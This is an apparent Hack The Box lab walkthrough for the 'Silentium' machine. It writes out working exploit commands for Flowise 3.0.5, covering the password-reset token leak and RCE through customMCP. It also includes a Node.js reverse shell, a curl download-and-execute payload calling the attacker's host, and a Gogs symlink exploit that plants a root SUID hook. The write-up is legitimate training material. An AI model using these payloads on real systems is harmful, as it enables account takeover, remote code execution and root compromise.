---
title: "Silentium"
description: "The attack chain involves exploiting two critical vulnerabilities in Flowise (an AI workflow platform) to gain initial access, escaping a Docker container using leaked…"
date: 2026-04-12
platform: "Hack The Box"
os: "Windows"
difficulty: "Medium"
tags: ["walkthrough", "htb", "active"]
---
## Summary
The attack chain involves exploiting two critical vulnerabilities in **Flowise** (an AI workflow platform) to gain initial access, escaping a Docker container using leaked credentials, and escalating privileges to root by exploiting a symlink vulnerability in **Gogs** (a self-hosted Git service).

## Machine Information

| Field        | Details              |
| ------------ | -------------------- |
| **IP**       | 10.129.26.157        |
| **OS**       | Linux (Ubuntu 24.04) |
| **Services** | SSH, HTTP (nginx)    |

##  Nmap Scan
```bash
nmap -p- 10.129.26.157 -A -Pn -vv -T4
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
|_http-favicon: Unknown favicon MD5: 033771DFEF9C64EFA01CAF726E3629A9
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=4/12%OT=22%CT=1%CU=44586%PV=Y%DS=2%DC=T%G=Y%TM=69DADF5
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11
OS:NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 16.330 days (since Thu Mar 26 15:59:24 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   84.54 ms 10.10.16.1
2   22.48 ms silentium.htb (10.129.26.157)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:55
Completed NSE at 00:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:55
Completed NSE at 00:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:55
Completed NSE at 00:55, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds

```

**Key findings:**
- Port 22 → OpenSSH 9.6p1
- Port 80 → nginx 1.24.0  "Silentium | Institutional Capital & Lending Solutions"
- Hostname revealed: `silentium.htb`

```bash
echo "10.129.26.157 silentium.htb" | sudo tee -a /etc/hosts
```

## Web Enumeration
Visiting `http://silentium.htb` reveals a static finance company website.
**Staff names found on the website:**

- **Marcus Thorne**  Managing Director
- **Ben**  Head of Financial Systems
- **Elena Rossi**  Chief Risk Officer

#### Sub-domian fuzzing

```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://silentium.htb
[+] Method:                    GET
[+] Threads:                   50
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
staging.silentium.htb Status: 200 [Size: 3142]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================

```

`staging.silentium.htb` added to local dns resolver on our host 
Add to /etc/hosts:
```bash
echo "10.129.26.157 staging.silentium.htb" | sudo tee -a /etc/hosts
```
#### Directory fuzzing
```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ ffuf -u http://silentium.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,403 -t 50 -fs 8753

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,301,302,403
 :: Filter           : Response size: 8753
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1582 req/sec :: Duration: [0:02:09] :: Errors: 0 ::

```

**Result:** Only `/assets` found  website is static, nothing useful.

#### Flowise Fingerprinting

Visiting `http://staging.silentium.htb` reveals a **Flowise login page**.
![Image](../../assets/images/Pasted-image-20260412010048.png)

Check the version
```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ curl -s http://staging.silentium.htb/api/v1/version | python3 -m json.tool
{
    "version": "3.0.5"
}

```

Flowise 3.0.5 is vulnerable to multiple CVEs!

### CVE-2025-58434 (Unauthenticated Password Reset Token Disclosure)

**Vulnerability:** The `/api/v1/account/forgot-password` endpoint returns a valid `tempToken` without any authentication, allowing complete account takeover.

| Field         | Details                                                                                                                                                      |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CVE**       | CVE-2025-58434                                                                                                                                               |
| **Severity**  | Critical (9.8)                                                                                                                                               |
| **Affected**  | Flowise ≤ 3.0.5                                                                                                                                              |
| **Reference** | [https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph) |

#### Find the admin email

![Image](../../assets/images/Pasted-image-20260412144454.png)

Using staff names from the website, we try email combinations:

```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb"}}' 

``` 

Response leaks tempToken:
```json

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"fWyYToRCLUPSKd8ONSJhyzECKtfnjyodu5vshqXIUT6usYH0S6FTzQJWrGV0IMjj","tokenExpiry":"2026-04-12T14:10:56.343Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-12T13:55:56.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}} 
 
```

#### Reset the password
```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb","tempToken":"fWyYToRCLUPSKd8ONSJhyzECKtfnjyodu5vshqXIUT6usYH0S6FTzQJWrGV0IMjj","password":"Pawned!123"}}'

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$RR9R0JL2LGcWZYjAeAEOvOEl09XxzZuE8x3bOiF97w8oiaap4EsjS","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-12T13:57:06.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}} 
```

Password has been resetted using **Pawned!123**

We can login as `Ben` now
![Image](../../assets/images/Pasted-image-20260412145533.png)


#### Login and grab JWT token

```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login -H "Content-Type: application/json" -d '{"email":"ben@silentium.htb","password":"Pawned!123"}' -c cookies.txt -v 2>&1 | grep "Set-Cookie" 

```

Token is saved as a cookie in `cookies.txt`

#### Get API key using header bypass
The `x-request-from: internal` header bypasses authorization checks on the API key endpoint:

```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/apikey -H "Content-Type: application/json" -H "x-request-from: internal" -b cookies.txt -d '{"keyName":"pwn"}' | python3 -m json.tool 
[
    {
        "id": "6bd2a704-42bd-4fcd-8ff2-bb4298c6deac",
        "apiKey": "rBlcvggHuEvku22tVfo7GD2p3PJsfgvMd0dhWxO9jUI",
        "apiSecret": "3f1597c7851cfb12767c6a022ed012fd1f75d8ea029b8602252ba9efdd43b639e2f04ee4f0453bfb0f8e8cc84b396e640410d79a9df9f591be0067c96a7e24b6.37058debc6c1660c",
        "keyName": "pwn",
        "updatedDate": "2026-04-12T14:00:49.000Z",
        "workspaceId": "c54b3e15-690b-4d76-bcca-6ee241f57f46",
        "chatFlows": []
    },
    {
        "id": "dbb137c0-631d-4e5d-8ece-f73896813d2f",
        "apiKey": "hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc",
        "apiSecret": "19dda1ff9ccdb6ce56886141e0a15bdd191685fb8894661c03be9a8bbc0c1e22d7aa99c2f349d616a69449b41bea3b87e1127117e20441b4dadd06a6065674e4.a440d02c8a3f40d8",
        "keyName": "DefaultKey",
        "updatedDate": "2026-03-16T22:51:46.000Z",
        "workspaceId": "c54b3e15-690b-4d76-bcca-6ee241f57f46",
        "chatFlows": []
    }
]

```

**Got API key:** `rBlcvggHuEvku22tVfo7GD2p3PJsfgvMd0dhWxO9jUI`

#### CVE-2025-59528 (Remote Code Execution via CustomMCP)

**Vulnerability:** The `mcpServerConfig` parameter is passed directly to the `Function()` constructor without sanitization, executing arbitrary JavaScript with full Node.js runtime privileges.

| Field         | Details                                                                                                                                                      |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CVE**       | CVE-2025-59528                                                                                                                                               |
| **Severity**  | Critical (10.0)                                                                                                                                              |
| **Affected**  | Flowise 3.0.5                                                                                                                                                |
| **Reference** | [https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) |


**Confirming RCE with ping test**

`Terminal 1` -> **Listen for ICMP**
```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:00:10.842676 IP silentium.htb > 10.10.16.99: ICMP echo request, id 466, seq 0, length 64
15:00:10.842698 IP 10.10.16.99 > silentium.htb: ICMP echo reply, id 466, seq 0, length 64
15:00:11.888978 IP silentium.htb > 10.10.16.99: ICMP echo request, id 466, seq 1, length 64
15:00:11.889001 IP 10.10.16.99 > silentium.htb: ICMP echo reply, id 466, seq 1, length 64
15:00:12.913631 IP silentium.htb > 10.10.16.99: ICMP echo request, id 466, seq 2, length 64
15:00:12.913670 IP 10.10.16.99 > silentium.htb: ICMP echo reply, id 466, seq 2, length 64

```

`Terminal 2` -> **Fire ping payload:**
```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP -H "Content-Type: application/json" -H "Authorization: Bearer rBlcvggHuEvku22tVfo7GD2p3PJsfgvMd0dhWxO9jUI" -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.exec(\"ping -c3 10.10.16.99\");return 1;})()})"}}'
```

ICMP packets received -> RCE confirmed!

**Why Node.js reverse shell?**
Bash, nc, and mkfifo reverse shells all failed because:

- The `cp.exec()` function spawns a limited shell
- Bash redirections (`>&`) don't work properly inside Node.js exec
- Node.js reverse shell works at the socket level  no shell redirections needed

**shell.js**
```bash
cd /tmp && cat > shell.js << 'EOF' const net = require('net'); const cp = require('child_process'); const sh = cp.spawn('/bin/sh', []); const client = new net.Socket(); client.connect(5555, '10.10.16.99', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); EOF
```

`Terminal 1 ` **Run the python server** 
```bash
python3 -m http.server 8080
```

`Terminal 2` **Start an netcat listner**

```bash
nc -lvnp 5555
```

`Terminal 3` **Trigger download and execute**

```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP -H "Content-Type: application/json" -H "Authorization: Bearer rBlcvggHuEvku22tVfo7GD2p3PJsfgvMd0dhWxO9jUI" -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.exec(\"curl http://10.10.16.99:8080/shell.js -o /tmp/shell.js && node /tmp/shell.js\");return 1;})()})"}}'
```

Successfully we got an reverse shell

```bash
┌──(penguin㉿0X0F)-[~/CPTS/Machines/S10/Silentium]
└─$ nc -lvnp 5555                        
listening on [any] 5555 ...
connect to [10.10.16.99] from (UNKNOWN) [10.129.26.230] 44060
id uid=0(root) gid=0(root) groups=0(root)
```



### Enumeration from the rev shell && Docker Container Detection & Escape


```bash
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

```bash
hostname
c78c3cceb7ba
```

We must be inside a Docker container !! classic docker behaviour

#### Checking for .dockerenv

```bash
ls -la /.dockerenv
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 /.dockerenv

```

#### Network interfaces
```bash
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 66:ff:38:7a:36:81 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

`eth0@if6`  the `@ifX` suffix means it's a veth pair (virtual ethernet), only exists in containers

| Indicator            | Finding                                    |
| -------------------- | ------------------------------------------ |
| `hostname`           | `c78c3cceb7ba` — random hex = Docker       |
| `ls -la /.dockerenv` | File exists → confirmed Docker             |
| `ip addr`            | `eth0@if5` — veth pair, only in containers |
| `cat /proc/1/cgroup` | Returns `0::/` — minimal container         |
| Filesystem           | No regular users in `/home`                |

#### Env Variable leaks credential

```bash
env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

`F1l3_d0ck3r` and `r04D!!_R4ge` has been revealed 

**SSH to Host as Ben**

we ssh to ben using the founded credential   `ben:r04D!!_R4ge`
```bash
ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt 
713d82f039b8c93fb9cc3eaffb1e9c45
ben@silentium:~$ 
```
## Privilege Escalation Enumeration

```bash
ben@silentium:~$ sudo -l
```

Password required and  none of the password worked

```bash
ben@silentium:~$ uname -a
Linux silentium 6.8.0-107-generic #107-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 13 19:51:50 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
ben@silentium:~$ id 
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
ben@silentium:~$ 

```

#### Checking SUID binaries
```bash
ben@silentium:~$ find / -perm -4000 -type f 2>/dev/null
```

Standard binaries nothing exploitable in it

#### Checking Running services
```bash
ben@silentium:~$ ss -tlnp
State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process     
LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*                    
LISTEN      0           4096                   0.0.0.0:22                   0.0.0.0:*                    
LISTEN      0           4096                 127.0.0.1:3001                 0.0.0.0:*                    
LISTEN      0           4096                 127.0.0.1:3000                 0.0.0.0:*                    
LISTEN      0           4096                127.0.0.54:53                   0.0.0.0:*                    
LISTEN      0           4096             127.0.0.53%lo:53                   0.0.0.0:*                    
LISTEN      0           4096                 127.0.0.1:8025                 0.0.0.0:*                    
LISTEN      0           4096                 127.0.0.1:1025                 0.0.0.0:*                    
LISTEN      0           4096                 127.0.0.1:33903                0.0.0.0:*                    
LISTEN      0           511                       [::]:80                      [::]:*                    
LISTEN      0           4096                      [::]:22                      [::]:*                    
ben@silentium:~$ 

```

```
127.0.0.1:3000   -> Flowise (Docker)
127.0.0.1:3001   -> Gogs (Git service)
127.0.0.1:1025   -> SMTP (MailHog)
127.0.0.1:8025   -> MailHog Web UI
```

```bash
ben@silentium:~$ ls /opt
containerd  gogs
ben@silentium:~$ 
```

**From the gogs config file its evident that gog run as Root User**
```bash
ben@silentium:~$ cat /opt/gogs/gogs/custom/conf/app.ini
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
OFFLINE_MODE     = false
EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/
DISABLE_SSH      = false
SSH_PORT         = 22
START_SSH_SERVER = false

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD = 
SSL_MODE = disable

[repository]
ROOT_PATH      = /root/gogs-repositories
DEFAULT_BRANCH = master
ROOT           = /root/gogs-repositories

[session]
PROVIDER = file

[log]
MODE      = file
LEVEL     = Info
ROOT_PATH = /opt/gogs/log

[security]
INSTALL_LOCK = true
SECRET_KEY   = sdsrcxSm0iC7wDO

[email]
ENABLED = false

[auth]
REQUIRE_EMAIL_CONFIRMATION  = false
DISABLE_REGISTRATION        = false
ENABLE_REGISTRATION_CAPTCHA = true
REQUIRE_SIGNIN_VIEW         = false

[user]
ENABLE_EMAIL_NOTIFICATION = false

[picture]
DISABLE_GRAVATAR        = false
ENABLE_FEDERATED_AVATAR = false

```

#### Port Forwarding to Access Gogs
```bash
ssh -L 7777:127.0.0.1:3001 ben@10.129.26.230
```

![Image](../../assets/images/Pasted-image-20260412152501.png)
Now we can register an user 

![Image](../../assets/images/Pasted-image-20260412152540.png)

## Gogs Symlink Attack (CVE-2024-55947)

##### What is a Symlink?
A **symlink (symbolic link)** is like a **shortcut or pointer** to another file or directory.

```
myfile.txt  ──────────►  /root/secret.txt
(shortcut)               (real file)
```

##### What is a Git Hook?
A **git hook** is a **script that runs automatically** when certain git events happen.

| Hook Name      | When it runs            |
| -------------- | ----------------------- |
| `pre-receive`  | Before accepting a push |
| `post-receive` | After accepting a push  |
| `pre-commit`   | Before a commit         |


**Vulnerability:** Gogs follows symlinks when writing files via the PutContents API, allowing arbitrary file writes on the server. Since Gogs runs as root, we can write to any file including git hooks.

| Field         | Details                                           |
| ------------- | ------------------------------------------------- |
| **CVE**       | CVE-2024-55947                                    |
| **Affected**  | Gogs ≤ 0.13.x                                     |
| **Impact**    | Arbitrary file write -> RCE as root               |
| **Reference** | https://github.com/advisories/GHSA-qf5v-rp47-55gg |

After Creating account get fresh API token

```bash
ben@silentium:~$ curl -s -X POST http://127.0.0.1:3001/api/v1/users/penguin/tokens -u "penguin:123" -H "Content-Type: application/json" -d '{"name":"pwn3"}' | python3 -m json.tool
{
    "name": "pwn3",
    "sha1": "352f3a43d13f61d98c72d710ae736fe4ce294aa3"
}
ben@silentium:~$ 

```

Before exploiting lets **create an repo called evil**
![Image](../../assets/images/Pasted-image-20260412154430.png)

#### Set up local git repo with symlink pointing to pre-receive file

The symlink points **directly to the pre-receive hook file**:

```bash
ben@silentium:~$ cd /tmp && mkdir exploit && cd exploit && git init && git config user.email "penguin@silentium.htb" && git config user.name "penguin" && git config core.symlinks true && ln -s /root/gogs-repositories/penguin/evil.git/hooks/pre-receive evil.link && git add -A && git commit -m "pwn" && git remote add origin http://penguin:123@127.0.0.1:3001/penguin/evil.git && git push origin master

hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/exploit/.git/
[master (root-commit) 262f0d2] pwn
 1 file changed, 1 insertion(+)
 create mode 120000 evil.link
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 254 bytes | 254.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To http://127.0.0.1:3001/penguin/evil.git
 * [new branch]      master -> master

```

#### Get symlink SHA
```bash
ben@silentium:/tmp/exploit$ curl -s "http://127.0.0.1:3001/api/v1/repos/penguin/evil/contents/evil.link" -H "Authorization: token 352f3a43d13f61d98c72d710ae736fe4ce294aa3" | python3 -m json.tool

```
the `sha` value from the response. 

```json
{
    "type": "symlink",
    "target": "/root/gogs-repositories/penguin/evil.git/hooks/pre-receive",
    "size": 58,
    "name": "evil.link",
    "path": "evil.link",
    "sha": "15f03073b28cb598313e0cd0186e4070d2fe09a9",
    "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/contents/evil.link",
    "git_url": "",
    "html_url": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/src/master/evil.link",
    "download_url": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/raw/master/evil.link",
    "_links": {
        "git": "",
        "self": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/contents/evil.link",
        "html": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/src/master/evil.link"
    }
}
```

Write malicious hook through symlink The base64 content decodes to `#!/bin/bash\nchmod u+s /bin/bash`:

```bash
ben@silentium:/tmp/exploit$ curl -s -X PUT "http://127.0.0.1:3001/api/v1/repos/penguin/evil/contents/evil.link" -H "Authorization: token 352f3a43d13f61d98c72d710ae736fe4ce294aa3" -H "Content-Type: application/json" -d '{"message":"hook","content":"IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=","sha":"15f03073b28cb598313e0cd0186e4070d2fe09a9"}' | python3 -m json.tool
```
Gogs (running as root) followed the symlink and wrote our malicious script to the actual `pre-receive` hook file.

```json
{
    "commit": {
        "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/contents/evil.link",
        "sha": "262f0d227e70f4e8e6c872cd6303ad52be0cc725",
        "html_url": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/commits/262f0d227e70f4e8e6c872cd6303ad52be0cc725",
        "commit": {
            "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/contents/evil.link",
            "author": {
                "name": "penguin",
                "email": "penguin@silentium.htb",
                "date": "2026-04-12T14:48:19Z"
            },
            "committer": {
                "name": "penguin",
                "email": "penguin@silentium.htb",
                "date": "2026-04-12T14:48:19Z"
            },
            "message": "pwn",
            "tree": {
                "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/tree/262f0d227e70f4e8e6c872cd6303ad52be0cc725",
                "sha": "262f0d227e70f4e8e6c872cd6303ad52be0cc725"
            }
        },
        "author": null,
        "committer": null,
        "parents": []
    },
    "content": {
        "type": "symlink",
        "target": "/root/gogs-repositories/penguin/evil.git/hooks/pre-receive",
        "size": 58,
        "name": "evil.link",
        "path": "evil.link",
        "sha": "15f03073b28cb598313e0cd0186e4070d2fe09a9",
        "url": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/contents/evil.link",
        "git_url": "",
        "html_url": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/src/master/evil.link",
        "download_url": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/raw/master/evil.link",
        "_links": {
            "git": "",
            "self": "http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/penguin/evil/contents/evil.link",
            "html": "http://staging-v2-code.dev.silentium.htb:3001/penguin/evil/src/master/evil.link"
        }
    }
}

```

Now trigger it by pushing to the repo:
```bash
echo "trigger" > trigger.txt && git add trigger.txt && git commit -m "trigger" && git push origin master

```
When we push, Gogs automatically runs the `pre-receive` hook as root --> `chmod u+s /bin/bash` executes!
```bash
ben@silentium:/tmp/exploit$ /bin/bash -p

```

```bash
bash-5.2# cat root.txt 
d811b502556cdef223e241d51800ff06
bash-5.2# 

```

**Prive Escalation** 
```
1. Created evil.link symlink
   evil.link ──────────► /root/gogs-repositories/penguin/evil.git/hooks/pre-receive

2. Pushed symlink to Gogs repo

3. Used PutContents API to "update" evil.link
   Gogs followed the symlink and wrote our script to pre-receive hook

4. Our malicious hook content:
   #!/bin/bash
   chmod u+s /bin/bash

5. We pushed a commit to trigger the hook
   Gogs ran pre-receive hook as root
   chmod u+s /bin/bash executed as root

6. /bin/bash now has SUID bit
   /bin/bash -p  →  ROOT SHELL!
```
